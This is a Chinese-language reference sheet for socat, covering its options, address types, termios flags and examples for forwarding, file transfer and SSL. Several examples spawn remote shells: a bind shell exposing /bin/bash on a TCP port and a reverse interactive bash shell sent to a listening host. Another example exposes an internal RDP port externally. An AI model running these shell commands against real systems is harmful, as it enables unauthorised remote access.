http://www.dest-unreach.org/socat/doc/

socat(过程){
init:命令行参数解析和日志系统建立
open:打开第一个address，然后打卡第二个address，这个过程阻塞进行，对于复杂的socks，
     第一个address连接建立和认证过程进行过后，才会打开第二个address。
transfer: 通过select检测两个socket的读写状态，当数据可以从一个address获取，打印新行(配置时)，
          将获取的数据写到两一个address中。继续进行以上过程。
close: 当一个address达到EOF的时候，close过程就开始了，socat发送EOF向另一个address。

初始化      解析命令行以及初始化日志系统。
打开连接    先打开第一个连接，再打开第二个连接。这个单步执行的。 如果第一个连接失败，则会直接退出。
数据转发    谁有数据就转发到另外一个连接上, read/write互换。
关闭        其中一个连接掉开，执行处理另外一个连接。

}

socat(选项){
-V              # 版本信息和支持特性
-h | -?         # 命令行选项和地址类型
-hh | -??       # 在命令行选项和地址类型基础上，追加简要的地址类型选项功能
-hhh | -???     # 在命令行选项和地址类型基础上，追加详细的地址类型选项功能
-d              # fatal 和 error 信息
-d -d           # fatal, error, warning, 和 notice 信息.
-d -d -d        # fatal, error, warning, notice, 和 info 信息
-d -d -d -d     # fatal, error, warning, notice, info, 和 debug 信息.
-D              # 在传输前打印文件描述打开信息
-ly[<facility>] # syslog代替stderr
-lf<logfile>    # 日志文件代替stderr
-ls             # stderr
-lp<progname>   # 指定打印程序名称
-lu             # 打印增加timestamp
-lm[<facility>] # init和open在stderr，传输在syslog
-lh             # 增加hostname到message中
-v              # 将传输的数据打印到stderr  text
-x              # 将传输的数据打印到stderr  hex
-b<size>        # 设置数据传块大小
-s              # 当设置的选项不支持时，退出不执行
-t<timeout>     # address的一个channel到EOF，另一个写channel终止了，等待timeout以后退出。 双客户端的时候使用。
-T<timeout>     # 长时间没有数据传输的情况下，退出
-u              # address1只用于读，address2只用于写
-U              # address1只用于写，address2只用于读
-g              # 不验证地址选项：例如串口设备配置了socket选项
-L<lockfile>    # lock存在则错误退出，否则，创建此文件，进行数据传输，退出时删除此文件
-W<lockfile>    # lock存在则等待被调度，当此文件不存在，创建此文件，进行数据传输，退出时删除此文件
}

address(规则){
1. : 用来分割必选参数
2. , 用来分割可选参数
keyword关键字：不区分大小写; 有些规则，关键字可以被忽略。数字表示fd; /开头达表示文件。
'-' == STDIO, 
TCP == TCP4
}


TCP4:要求(name or address)和 (number or service name)
-g  :选项集
address(CREATE){
CREATE:<filename> 创建一个filename，用于数据输出。filename是管道，创建将被阻塞。filename是socket，则出错。
    选项组: FD,REG,NAMED
    可用选项: mode, user, group, unlink-early, unlink-late, append
    进一步: OPEN, GOPEN
}
address(EXEC){
EXEC:<command-line> Forks一个子进程。与父进程通信和调用execvp()执行<command-line>
    选项组: FD,SOCKET,EXEC,FORK,TERMIOS
    可用选项: path, fdin, fdout, chroot, su, su-d, nofork, pty, stderr,  ctty,  setsid,  pipes,  login,  sigint, sigquit
    进一步: SYSTEM
    
nc -lp localhost 700 -e /bin/bash    # 正向shell
socat TCP-LISTEN:700 EXEC:/bin/bash  # 正向shell

socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./helloworld # 将一个使用标准输入输出的单进程程序变为一个使用fork方法的多进程服务

### 反弹一个交互式的 Shell ###
# 当有主机连接服务端的 7005 端口时，将会发送客户端的 Shell 给服务端。
# 1. 服务端
socat -,raw,echo=0 tcp-listen:7005
# 2. 客户端
socat tcp-connect:192.168.1.252:7005 exec:'bash -li',pty,stderr,setsid,si

}
address(FD){
FD:<fdnum> 必选是一个已存在的unix文件描述符
    选项组: FD (TERMIOS,REG,SOCKET)
    进一步: STDIO, STDIN, STDOUT, STDERR
}
address(GOPEN){
GOPEN:<filename> 支持文件系统上除目录外的设备；socket则connects。文件则O_APPEND或者先O_CREAT
    选项组: FD,REG,SOCKET,NAMED,OPEN
    进一步: OPEN, CREATE, UNIX-CONNECT
}
address(IP-SENDTO){
IP-SENDTO:<host>:<protocol> raw数据连接
    选项组: FD,SOCKET,IP4,IP6
    可用选项: pf, ttl
    进一步: IP4-SENDTO, IP6-SENDTO, IP-RECVFROM, IP-RECV, UDP-SENDTO, UNIX-SENDTO
    
IP4-SENDTO:<host>:<protocol>
    可用选项:  FD,SOCKET,IP4
IP6-SENDTO:<host>:<protocol>
    可用选项:  FD,SOCKET,IP6
}
address(INTERFACE){
INTERFACE:<interface> 网络接口
    选项组:  FD,SOCKET
    可用选项: pf, type
    进一步:  ip-recv
}
address(IP-DATAGRAM){
IP-DATAGRAM:<address>:<protocol>
    选项组:  FD, SOCKET, IP4, IP6, RANGE
    可用选项: bind, range, tcpwrap, broadcast, ip-multicast-loop, ip-multicast-ttl, ip-multicast-if, ip-add-mem‐ bership, ttl, tos, pf
    进一步: IP4-DATAGRAM, IP6-DATAGRAM, IP-SENDTO, IP-RECVFROM, IP-RECV, UDP-DATAGRAM
    
IP4-DATAGRAM:<host>:<protocol>
    可用选项: FD,SOCKET,IP4,RANGE
IP6-DATAGRAM:<host>:<protocol>
    可用选项:FD,SOCKET,IP6,RANGE
}
address(IP-RECVFROM){
IP-RECVFROM:<protocol>
    选项组: FD,SOCKET,IP4,IP6,CHILD,RANGE
    可用选项: pf, fork, range, ttl, broadcast
    进一步: IP4-RECVFROM, IP6-RECVFROM, IP-SENDTO, IP-RECV, UDP-RECVFROM, UNIX-RECVFROM
IP4-RECVFROM:<protocol>
    可用选项: FD,SOCKET,IP4,CHILD,RANGE
IP6-RECVFROM:<protocol>
    可用选项: FD,SOCKET,IP6,CHILD,RANGE
}
address(IP-RECV){
IP-RECV:<protocol>
    选项组:  FD,SOCKET,IP4,IP6,RANGE
    可用选项: pf, range
    进一步: IP4-RECV, IP6-RECV, IP-SENDTO, IP-RECVFROM, UDP-RECV, UNIX-RECV
IP4-RECV:<protocol>
    可用选项: FD,SOCKET,IP4,RANGE
IP6-RECV:<protocol>
    可用选项:  FD,SOCKET,IP6,RANGE
}
address(OPEN){
OPEN:<filename> open文件进行读写
    选项组:  FD,REG,NAMED,OPEN
    可用选项:  creat, excl, noatime, nofollow, append, rdonly, wronly, lock, readbytes, ignoreeof
    进一步: CREATE, GOPEN, UNIX-CONNECT
    
### 将文件 demo.tar.gz 使用 2000 端口从 192.168.1.252 传到 192.168.1.253,文件传输完毕后会自动退出。###
# 在 192.168.1.252 上执行
socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr
# 在 192.168.1.253 上执行
socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create
  -u 表示数据传输模式为单向，从左面参数到右面参数。
  -U 表示数据传输模式为单向，从右面参数到左面参数。

### 可以实现一个假的 Web Server，客户端连过来之后就把 read.html 里面的内容传过去，同时把客户端的数据保存到 write.txt 里面。 ###
socat open:read.html\!\!open:write.txt,create,append tcp-listen:8000,reuseaddr,fork
  !! 符号用于合并读写流，前面的用于读，后面的用于写。

}
address(OPENSSL){
OPENSSL:<host>:<port>  SSL connection 
    选项组: FD,SOCKET,IP4,IP6,TCP,OPENSSL,RETRY
    可用选项:  cipher, method, verify, cafile, capath, certificate, key, bind, pf,  connect-timeout,  sourceport,retry
    进一步:  OPENSSL-LISTEN, TCP

# 通过 Openssl 来加密传输过程 
server.domain.org  并且服务端程序使用 4433 端口
    我们使用一个非常简单的服务功能，即服务端仅回显数据（echo），客户端只进行标准输入（stdio）。
要进行 Openssl 加密数据传输，首先需要生成 Openssl 证书。

1. 生成服务端的证书 -> 服务端证书生成完成后，复制信任证书 server.crt 到 SSL 客户端所在的主机上。
# 为服务端的证书取一个基本的名字。
FILENAME=server
# 生成公钥私钥对。
openssl genrsa -out $FILENAME.key 1024
# 生成一个自签名的证书，会提示你输入国家代号、姓名等，或者按下回车键跳过输入提示。
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
# 用刚生成的密钥文件和证书文件来生成PEM文件。
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem

2. 生成客户端证书 -> 复制 client.pem 到 SSL 客户端主机，复制 client.crt 到服务端主机。
# 为客户端证书取一个不同的文件名
FILENAME=client
# 生成公钥私钥对。
openssl genrsa -out $FILENAME.key 1024
# 生成一个自签名的证书，会提示你输入国家代号、姓名等，或者按下回车键跳过输入提示。
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
# 用刚生成的密钥文件和证书文件来生成PEM文件。
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem

服务端有 server.pem、client.crt 两个文件，
客户端有 client.pem 、server.crt 两个文件。

# cert 参数告诉 Socat 包含证书和私钥的文件，cafile 参数指向客户端的证书文件。
# 如果客户端能提供相关联的私钥，我们则认为该连接是可靠的。
socat openssl-listen:4433,reuseaddr,cert=server.pem,cafile=client.crt echo
# 客户端
socat stdio openssl-connect:server.domain.org:4433,cert=client.pem,cafile=server.crt

-------------------------------------------------------------------------------
1) Generate self signed server certificate
# generate a private key;
$ openssl genrsa -out server.key 1024
# generate a self signed cert:
$ openssl req -new -key server.key -x509 -days 3653 -out server.crt
#     enter fields... (may all be empty when cert is only used privately)
# generate the pem file:
$ cat server.key server.crt >server.pem
# secure permissions:
$ chmod 600 server.key server.pem
# copy server.pem to the server host using a secure channel (floppy, scp...)
#    and keep tight permissions
# remove all other instances of server.key and server.pem
# copy server.crt to the client host

2) Generate self signed client certificate
# like server certificate, but use names client.*
# copy client.pem to the client host using a secure channel (floppy, scp...)
#    and keep tight permissions
# remove all other instances of client.key and client.pem
# copy client.crt to the server host

3) Start socat based SSL server
# on server host:
$ socat ssl-l:1443,reuseaddr,fork,cert=server.pem,cafile=client.crt,verify=1 exec:'uptime'

4) Invoke socat based SSL client
# on client host:
$ socat - ssl:server-host:1443,cert=client.pem,cafile=server.crt
}
address(OPENSSL-LISTEN){
OPENSSL-LISTEN:<port> SSL server
    选项组: FD,SOCKET,IP4,IP6,TCP,LISTEN,OPENSSL,CHILD,RANGE,RETRY
    可用选项: pf,  cipher,  method,  verify, cafile, capath, certificate, key, fork, bind, range, tcpwrap, su, reuseaddr, retry
    进一步: OPENSSL, TCP

socat OPENSSL-LISTEN:443,cert=/cert.pem - # 需要首先生成证书文件
socat - OPENSSL:localhost:443             # SSL客户端
}
address(PIPE){
PIPE:<filename>  命名管道 filename存在则打开，filename不存在则创建然后打开。 支持读写
    选项组: FD,NAMED,OPEN
    可用选项:  rdonly, nonblock, group, user, mode, unlink-early
    进一步: unnamed pipe

PIPE ：匿名管道
}

address(PROXY){
PROXY:<proxy>:<hostname>:<port>  代理
    选项组: FD,SOCKET,IP4,IP6,TCP,HTTP,RETRY
    可用选项: proxyport, ignorecr, proxyauth, resolve, crnl, bind, connect-timeout, mss, sourceport, retry
    进一步:  SOCKS, TCP
}
address(PTY){
PTY : 创建一个伪终端，使用master，另一连接到slave可以作为一个终端客户端使用。
    选项组: FD,NAMED,PTY,TERMIOS
    可用选项:link, openpty, wait-slave, mode, user, group
    进一步: UNIX-LISTEN, PIPE, EXEC, SYSTEM
}
address(READLINE){
READLINE
    选项组: FD,READLINE,TERMIOS
    可用选项:Useful options: history, noecho
    进一步: STDIO
    
socat READLINE,history=$HOME/.cmd_history /dev/ttyS0,raw,echo=0,crnl # 将终端转发到COM1
}
address(SOCKET-CONNECT){
SOCKET-CONNECT:<domain>:<protocol>:<remote-address>


}
address(SOCKET-DATAGRAM){
SOCKET-DATAGRAM:<domain>:<type>:<protocol>:<remote-address>
}
address(SOCKET-LISTEN){
SOCKET-LISTEN:<domain>:<protocol>:<local-address>
}
address(SOCKET-RECV){
SOCKET-RECV:<domain>:<type>:<protocol>:<local-address>
}
address(SOCKET-RECVFROM){
SOCKET-RECVFROM:<domain>:<type>:<protocol>:<local-address>
}
address(SOCKET-SENDTO){
SOCKET-SENDTO:<domain>:<type>:<protocol>:<remote-address>
}
address(SOCKS4){
SOCKS4:<socks-server>:<host>:<port>
}
addresss(SOCKS4A){
SOCKS4A:<socks-server>:<host>:<port>
}
addresss(STDIO){
STDERR Uses file descriptor 2.
STDIN  Uses file descriptor 0.
STDIO  Uses file descriptor 0 for reading, and 1 for writing.
STDOUT Uses file descriptor 1.

socat - -                                  # 直接回显
socat - /home/user/chuck                   # cat文件
echo "hello" | socat - /home/user/chuck    # 写文件
}

address(SYSTEM){
SYSTEM:<shell-command>

# 在服务端 7005 端口建立一个 Shell。 
1. 服务端
socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr 
或者 
socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr

2. 客户端
# 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能。
socat readline tcp:127.0.0.1:7005
}

address(TCP){
TCP:<host>:<port>
TCP4:<host>:<port>
TCP6:<host>:<port>

nc localhost 80           # 连接远程端口
socat - TCP:localhost:80  # 连接远程端口

}
address(TCP-LISTEN){
TCP-LISTEN:<port>
TCP4-LISTEN:<port>
TCP6-LISTEN:<port>

nc -lp localhost 700     # 监听端口
socat TCP-LISTEN:700 -   # 监听端口

socat TCP-LISTEN:80,fork TCP:www.domain.org:80 # 将本地80端口转发到远程的80端口

# 监听 192.168.1.252 网卡的 15672 端口，并将请求转发至 172.17.0.15 的 15672 端口。
socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672
1. -d -d  前面两个连续的 -d -d 代表调试信息的输出级别。 
2. -lf /var/log/socat.log 指定输出信息的文件保存位置。 
3. TCP4-LISTEN:15672 在本地建立一个 TCP IPv4 协议的监听端口，也就是转发端口。
4. bind 指定监听绑定的 IP 地址，不绑定的话将监听服务器上可用的全部 IP。 
5. reuseaddr 绑定一个本地端口。 
6. TCP4:172.17.0.15:15672 指的是要转发到的服务器 IP 和端口，这里是 172.17.0.15 的 15672 端口。

socat -d -d -lf /var/log/socat.log UDP4-LISTEN:123,bind=192.168.1.252,reuseaddr,fork UDP4:172.17.0.15:123

#### 外部机器上的 3389 就映射在内网 192.168.1.34 的 3389 端口上 ####
# 在外部公网机器上执行
socat tcp-listen:1234 tcp-listen:3389
# 内部私网机器上执行
socat tcp:outerhost:1234 tcp:192.168.1.34:3389

}
address(TUN){
TUN:<if-addr>/<bits> 创建一个Linux TUN/TAP设备，给设备配置地址和子网掩码；网络接口可以被其他应用程序使用
    选项组: FD,NAMED,OPEN,TUN
    可用选项:iff-up, tun-device, tun-name, tun-type, iff-no-pi
    进一步:p-recv
}
address(UDP){
UDP:<host>:<port>
UDP4:<host>:<port>
UDP6:<host>:<port>
} 

address(UDP-DATAGRAM){

UDP-DATAGRAM:<address>:<port>
UDP4-DATAGRAM:<address>:<port>
UDP6-DATAGRAM:<address>:<port>
}

address(UDP-LISTEN){
UDP-LISTEN:<port>
UDP4-LISTEN:<port>
UDP6-LISTEN:<port>

}

address(UDP-SENDTO){
UDP-SENDTO:<host>:<port>
UDP4-SENDTO:<host>:<port>
UDP6-SENDTO:<host>:<port>
}

address(UDP-RECVFROM){
UDP-RECVFROM:<port>
UDP4-RECVFROM:<port>
UDP6-RECVFROM:<port>
}


address(UDP-RECV){
UDP-RECV:<port>
UDP4-RECV:<port>
UDP6-RECV:<port>
}


address(UNIX){
UNIX-CONNECT:<filename>
UNIX-LISTEN:<filename>
UNIX-SENDTO:<filename>
UNIX-RECVFROM:<filename>
UNIX-RECV:<filename>
UNIX-CLIENT:<filename>
}


address(ABSTRACT){
ABSTRACT-CONNECT:<string>
ABSTRACT-LISTEN:<string>
ABSTRACT-SENDTO:<string>
ABSTRACT-RECVFROM:<string>
ABSTRACT-RECV:<string>
ABSTRACT-CLIENT:<string>
}

keyword=value
option(FD){
FD option group
cloexec=<bool>  FD_CLOEXEC fcntl()
# g-x,g+s  & mountd mand选项 -> mandatory lock 命令的, 托管的  读锁 
# advisory lock   顾问的, 咨询的, 劝告的
setlk          写锁 fcntl(fd, F_SETLK, ...)
setlkw         写锁 fcntl(fd, F_SETLKW, ...)
setlk-rd       读锁 fcntl(fd, F_SETLK, ...)
setlkw-rd      读锁 fcntl(fd, F_SETLKW, ...)
flock-ex            flock(fd, LOCK_EX)
flock-ex-nb         flock(fd, LOCK_EX|LOCK_NB)
flock-sh            flock(fd, LOCK_SH)
flock-sh-nb         flock(fd, LOCK_SH|LOCK_NB)

user=<user>         chown() fchown()     创建时
user-late=<user>    chown() fchown()     创建后
group=<group>       chown() fchown()     创建时
group-late=<group>  chown() fchown()     创建后
mode=<mode>         open() or creat() chmod()  创建时
perm-late=<mode>    chmod()                    创建后
append=<bool>       open(O_APPEND)  fcntl(fd, F_SETFL, O_APPEND)
nonblock=<bool>     open(O_NONBLOCK) fcntl(fd, F_SETFL, O_NONBLOCK)
binary              Cygwin
text                Cygwin
noinherit           Cygwin
cool-write          写时发生EPIPE or ECONNRESET，打印notice而不是error
end-close           socket结束close而不是shutdown，用在EXEC or SYSTEM
shut-none
shut-down           shutdown(fd, SHUT_WR)
shut-close          close(fd)
shut-null           发送内容为空的数据包
null-eof            将空数据包作为结束标识
ioctl-void=<request>            ioctl调用
ioctl-int=<request>:<value>     ioctl调用
ioctl-intp=<request>:<value>    ioctl调用
ioctl-bin=<request>:<value>     ioctl调用
ioctl-string=<request>:<value>  ioctl调用
}

option(NANMED){
NAMED option group
user, group, and mode     
user-early=<user>         访问前修改chown()
group-early=<group>       访问前修改chown()
perm-early=<mode>         访问前修改chmod()
umask=<mode>              访问前修改umask 
unlink-early              open和user-early前Unlinks
unlink                    accessing前和user-early后Unlinks
unlink-late               opening后
unlink-close              closing后

}
option(OPEN){
OPEN option group
append and nonblock.
creat=<bool>             不存在则创建
dsync=<bool>             write()在metainfo写入磁盘之后
excl=<bool>              与creat一起使用，存在则报错
largefile=<bool>         超过2GB大文件
noatime                   O_NOATIME 读文件不修改文件访问时间
noctty=<bool>             不把此文件作为控制终端
nofollow=<bool>          不作为链接文件访问
nshare=<bool>             不把此文件共享给其他进程
rshare=<bool>             读共享写不共享
rsync=<bool>              write()在metainfo写入磁盘之后
sync=<bool>               write()在data写入磁盘之后
rdonly=<bool>             仅读
wronly=<bool>             仅写
trunc                     截断为0

}

option(REG){
REG and BLK option group
seek=<offset>          lseek(fd, <offset>, SEEK_SET)
seek-cur=<offset>      lseek(fd, <offset>, SEEK_CUR)
seek-end=<offset>      lseek(fd, <offset>, SEEK_END)
ftruncate=<offset>
# Linux with ext2fs, ext3fs, or reiserfs
secrm=<bool>            chattr
unrm=<bool>             chattr
compr=<bool>            chattr
ext2-sync=<bool>        chattr
immutable=<bool>        chattr
ext2-append=<bool>      chattr
nodump=<bool>           chattr
ext2-noatime=<bool>     chattr
journal-data=<bool>     chattr
notail=<bool>           chattr
dirsync=<bool>          chattr

}

option(PROCESS){
PROCESS option group
chroot=<directory>
socat TCP4-LISTEN:5555,fork,tcpwrap=script EXEC:/bin/myscript,chroot=/home/sandbox,su-d=sandbox,pty,stderr
chroot-early=<directory>
setgid=<group>
setgid-early=<group>
setuid=<user>
setuid-early=<user>
su=<user>
socat -d -d -lmlocal2 \
TCP4-LISTEN:80,bind=myaddr1,su=nobody,fork,range=10.0.0.0/8,reuseaddr TCP4:www.domain.org:80,bind=myaddr2

su-d=<user>
socat TCP4-LISTEN:5555,fork,tcpwrap=script \
EXEC:/bin/myscript,chroot=/home/sandbox,su-d=sandbox,pty,stderr

setpgid=<pid_t>
setsid
(sleep 5; echo PASSWORD; sleep 5; echo ls; sleep 1) |
socat - EXEC:'ssh -l user server',pty,setsid,ctty

}

option(READLINE){
READLINE option group
history=<filename>
socat -d -d READLINE,history=$HOME/.http_history \
TCP4:www.domain.org:www,crnl

noprompt
socat READLINE,noecho='[Pp]assword:' EXEC:'ftp ftp.server.com',pty,setsid,ctty

noecho=<pattern>
prompt=<string>
}

option(APPLICATION){
APPLICATION option group
cr      NL->CR   write   CR->NL   read
crnl    NL->CRNL write   CRNL->NL read
ignoreeof                tail -f
socat -u /tmp/readdata,seek-end=0,ignoreeof -

readbytes=<bytes>      # dd
lockfile=<filename>    1. lockfile exists, exits with error. 2. lockfile does not exist, creates it and continues, unlinks lockfile on exit.
waitlock=<filename>    1. lockfile exists, waits until it disappears. 2.lockfile does not exist, creates it and continues, unlinks lockfile on exit. 
escape=<int>
socat -,escape=0x0f /dev/ttyS0,rawer,crnl

}

option(SOCKET){
SOCKET option group
bind=<sockname>                 IP->[hostname|hostaddress][:(service|port)]   unix->filename
connect-timeout=<seconds>
so-bindtodevice=<interface>
broadcast
debug
dontroute
keepalive
linger=<seconds>
oobinline
priority=<priority>
rcvbuf=<bytes>
rcvbuf-late=<bytes>
rcvlowat=<bytes>
rcvtimeo=<seconds>
reuseaddr                        允许一个socket已经绑定了指定端口号上
sndbuf=<bytes>
sndbuf-late=<bytes>
sndlowat=<bytes>
sndtimeo=<seconds>
pf=<string>
type=<type>
prototype
so-timestamp
setsockopt-int=<level>:<optname>:<optval>
setsockopt-bin=<level>:<optname>:<optval>
setsockopt-string=<level>:<optname>:<optval>
}

option(UNIX){
UNIX option group
}

option(IP4 IP6){
IP4 and IP6 option groups

IP6 option group
}

option(TCP){
TCP option group

}

option(UDP, TCP, and SCTP){
UDP, TCP, and SCTP option groups

}

option(SOCKS){
SOCKS option group

}

option(HTTP){

HTTP option group
}

option(RANGE){
RANGE option group

}

option(LISTEN){
LISTEN option group

}

option(CHILD){
CHILD option group

}

option(EXEC){
EXEC option group
path=<string> # 覆盖环境变量PATH,根据string指定路径查找程序名，也影响子进程
login         # 实现登录shell功能
}

option(FORK){
FORK option group
nofork
pipes
openpty
ptmx
pty
ctty
stderr
fdin
fdout
sighup, sigint, sigquit
}

option(TERMIOS){
TERMIOS option group
b0              # 设置速度为 B0 使得 modem "挂机"。
b19200          # socat -hh |grep ' b[1-9]' 波特率
echo=<bool>     # 回显输入字符。
icanon=<bool>   # 启用标准模式 (canonical mode)。允许使用特殊字符 EOF, EOL, EOL2, ERASE, KILL, LNEXT, REPRINT, STATUS, 和 WERASE，以及按行的缓冲。
rawer           # 默认关闭回显
cfmakeraw       # 就是将终端设置为原始模式，该模式下所有的输入数据以字节为单位被处理。在原始模式下，终端是不可回显的，而且所有特定的终端输入/输出模式不可用。
  ignbrk=<bool>   # 忽略或解释 BREAK character (e.g., ^C)  c_iflag.IGNBRK
  brkint=<bool>   # 如果设置了 IGNBRK，将忽略 BREAK。      c_iflag.BRKINT
                  # 如果没有设置，但是设置了 BRKINT，那么 BREAK 将使得输入和输出队列被刷新
                    # 如果终端是一个前台进程组的控制终端，这个进程组中所有进程将收到 SIGINT 信号。
                    # 如果既未设置IGNBRK 也未设置 BRKINT，BREAK 将视为与 NUL 字符同义，除非设置了 PARMRK，这种情况下它被视为序列 /377/0/0。
bs0
bs1
bsdly=<0|1>      # 回退延时掩码。取值为 BS0 或 BS1。(从来没有被实现过)
clocal=<bool>    # 忽略 modem 控制线。
cr0
cr1
cr2
cr3      
crdly=<0|1|2|3>     # 回车延时掩码。取值为 CR0, CR1, CR2, 或 CR3。 c_oflag.CRDLY
cread=<bool>        # 打开接受者。
crtscts=<bool>      # (不属于 POSIX) 启用 RTS/CTS (硬件) 流控制。
cs5
cs6
cs7
cs8          
csize=<0|1|2|3>   # 字符长度掩码。取值为 CS5, CS6, CS7, 或 CS8。
cstopb=<bool>     # true 设置两个停止位，而不是一个。
dsusp=<byte>  # VDSUSP character
echoctl=<bool>  #　如果同时设置了 ECHO，除了 TAB, NL, START, 和 STOP 之外的 ASCII 控制信号被回显为 ^X, 这里 X 是比控制信号大 0x40 的 ASCII 码。例如，字符 0x08 (BS) 被回显为 ^H。
echoe=<bool>    # 如果同时设置了 ICANON，字符 ERASE 擦除前一个输入字符，WERASE 擦除前一个词。
echok=<bool>    # 如果同时设置了 ICANON，字符 KILL 删除当前行。
echoke=<bool>   # 如果同时设置了 ICANON，回显 KILL 时将删除一行中的每个字符，如同指定了 ECHOE 和ECHOPRT 一样。
echonl=<bool>   # 如果同时设置了 ICANON，回显字符 NL，即使没有设置 ECHO。
echoprt=<bool>  # 如果同时设置了 ICANON 和 IECHO，字符在删除的同时被打印。
eof=<byte>      # 文件尾字符。更精确地说，这个字符使得 tty 缓冲中的内容被送到等待输入的用户程序中，而不必等到 EOL。如果它是一行的第一个字符，那么用户程序的 read() 将返回 0，指示读到了 EOF。当设置 ICANON 时可被识别，不再作为输入传递。
eol=<byte>      # (0, NUL) 附加的行尾字符。当设置 ICANON 时可被识别。
eol2=<byte>     # 另一个行尾字符。当设置 ICANON 时可被识别。
erase=<byte>    # 删除字符。删除上一个还没有删掉的字符，但不删除上一个 EOF 或行首。当设置 ICANON 时可被识别，不再作为输入传递。
discard=<byte>  # (not in POSIX; not supported under Linux; 017, SI, Ctrl-O) 开关：开始/结束丢弃未完成的输出。当设置 IEXTEN 时可被识别，不再作为输入传递。
ff0
ff1
ffdly=<bool>          # 进表延时掩码。取值为 FF0 或 FF1。
flusho=<bool>         # 输出被刷新。这个标志可以通过键入字符 DISCARD 来开关。
hupcl=<bool>           # 在最后一个进程关闭设备后，降低 modem 控制线 (挂断)。
  icrnl=<bool>         # 将输入中的回车翻译为新行 (除非设置了 IGNCR)。  c_iflag.ICRNL
iexten=<bool>          # 启用实现自定义的输入处理。这个标志必须与 ICANON 同时使用，才能解释特殊字符 EOL2，LNEXT，REPRINT 和 WERASE，IUCLC 标志才有效。
  igncr=<bool>         # 忽略输入中的回车。  c_iflag.IGNCR
  ignpar=<bool>      # 忽略桢错误和奇偶校验错。  c_iflag.IGNPAR
  imaxbel=<bool>     # (不属于 POSIX) 当输入队列满时响零。Linux 没有实现这一位，总是将它视为已设置。
  inlcr=<bool>         # 将\r\n转换成\n   c_iflag.INLCR
  inpck=<bool>       # c_iflag.INPCK 启用输入奇偶检测。
intr=<byte>
isig=<bool>          # 当接受到字符 INTR, QUIT, SUSP, 或 DSUSP 时，产生相应的信号。
ispeed=<unsigned-int>
    Set the baud rate for incoming data on this line.
    See also: ospeed, b19200
  istrip=<bool>      # ISTRIP 去掉第八位。 c_iflag.ISTRIP
  iuclc=<bool>       # (不属于 POSIX) 将输入中的大写字母映射为小写字母。 c_iflag.IUCLC
  ixany=<bool>       # (不属于 POSIX.1；XSI) 允许任何字符来重新开始输出。 c_iflag.IXANY
  ixoff=<bool>       # 启用输入的 XON/XOFF 流控制。 c_iflag.IXOFF
  ixon=<bool>        # 启用输出的 XON/XOFF 流控制。 c_iflag.IXON
kill=<byte>          # 终止字符。删除自上一个 EOF 或行首以来的输入。当设置 ICANON 时可被识别，不再作为输入传递。
lnext=<byte>         # 字面上的下一个。引用下一个输入字符，取消它的任何特殊含义。当设置 IEXTEN 时可被识别，不再作为输入传递。
min=<byte>           # 非 canonical 模式读的最小字符数。
nl0
    Sets the newline delay to 0.
nl1
nldly=<bool>      # 新行延时掩码。取值为 NL0 和 NL1。c_oflag.NLDLY
noflsh=<bool>     # 禁止在产生 SIGINT, SIGQUIT 和 SIGSUSP 信号时刷新输入和输出队列。
  ocrnl=<bool>    # 将输出中的回车映射为新行符 c_oflag.OCRNL
  ofdel=<bool>    # (不属于 POSIX) 填充字符是 ASCII DEL (0177)。如果不设置，填充字符则是 ASCII NUL。 c_oflag.OFDEL
  ofill=<bool>    # 发送填充字符作为延时，而不是使用定时来延时。c_oflag.OFILL
  olcuc=<bool>    # (不属于 POSIX) 将输出中的小写字母映射为大写字母。c_oflag.OLCUC
  onlcr=<bool>    # (XSI) 将输出中的新行符映射为回车-换行。 c_oflag.ONLCR
  onlret=<bool>   # 不输出回车。 c_oflag.ONLRET
  onocr=<bool>    # 不在第 0 列输出回车。c_oflag.ONOCR
  opost=<bool>    # 启用具体实现自行定义的输出处理。c_oflag.OPOST
  
    Enables or disables output processing; e.g., converts NL to CR-NL.
ospeed=<unsigned-int>
parenb=<bool>       # 允许输出产生奇偶信息以及输入的奇偶校验。
  parmrk=<bool>     # 如果没有设置 IGNPAR，在有奇偶校验错或桢错误的字符前插入 /377/0。
                    # 如果既没有设置 IGNPAR 也没有设置PARMRK，将有奇偶校验错或桢错误的字符视为 /0。
parodd=<bool>       # 输入和输出是奇校验。
pendin=<bool>       # 在读入下一个字符时，输入队列中所有字符被重新输出。
quit=<byte>         # 退出字符。发出 SIGQUIT 信号。当设置 ISIG 时可被识别，不再作为输入传递。
reprint=<byte>
sane
start=<byte>   # 开始字符。重新开始被 Stop 字符中止的输出。当设置 IXON 时可被识别，不再作为输入传递。
stop=<byte>    # 停止字符。停止输出，直到键入 Start 字符。当设置 IXON 时可被识别，不再作为输入传递。
susp=<byte>    # 挂起字符。发送 SIGTSTP 信号。当设置 ISIG 时可被识别，不再作为输入传递。
swtc=<byte>    # 开关字符。(只为 shl 所用。)
tab0
tab1
tab2
tab3
tabdly=<unsigned-int>   # 水平跳格延时掩码。取值为 TAB0, TAB1, TAB2, TAB3 (或 XTABS)。取值为 TAB3，即 XTABS，将扩展跳格为空格 (每个跳格符填充 8 个空格)。
time=<byte>        # 非 canonical 模式读时的延时，以十分之一秒为单位。
tostop=<bool>     # 向试图写控制终端的后台进程组发送 SIGTTOU 信号。
vt0
vt1
vtdly=<bool>          # 竖直跳格延时掩码。取值为 VT0 或 VT1。
werase=<byte>
xcase=<bool>          # 如果同时设置了 ICANON，终端只有大写。输入被转换为小写，除了以 / 前缀的字符。输出时，大写字符被前缀 /，小写字符被转换成大写。
xtabs                 # 见TABDLY
i-pop-all
i-push=<string>

socat -d -d /dev/ttyUSB1,raw,nonblock,ignoreeof,cr,echo=0 TCP4-LISTEN:5555,reuseaddr # 
socat -d -d /dev/ttyUSB0,raw,nonblock,ignoreeof,cr,echo=0 udp-listen:5555,reuseaddr  # 

#open a tcp 9600 port & set to baud rate 9600. The usb serial port is /dev/ttyUSB0 
